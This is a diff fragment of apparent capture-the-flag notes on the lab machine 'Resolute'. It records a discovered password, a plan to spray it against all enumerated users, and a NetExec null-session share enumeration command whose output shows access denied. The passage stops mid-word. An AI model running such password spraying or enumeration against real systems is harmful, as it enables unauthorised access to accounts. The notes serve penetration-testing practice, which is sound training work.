@@ -119,3 +119,16 @@ SMB         10.129.96.155   445    RESOLUTE         [*] Writing 27 local users t
 Managed to dump all users to a user list 
 
 Also found a password `Welcome123!
+
+Ill spray this against all the users
+
+### Shares
+```python
+nxc smb resolute.megabank.local -u '' -p '' --shares                
+SMB         10.129.96.155   445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
+SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\: 
+SMB         10.129.96.155   445    RESOLUTE         [-] Error enumerating shares: STATUS_ACCESS_DENIED
+```
+Cannot enumerate shares using null authentication
+
+Also worth noting ta
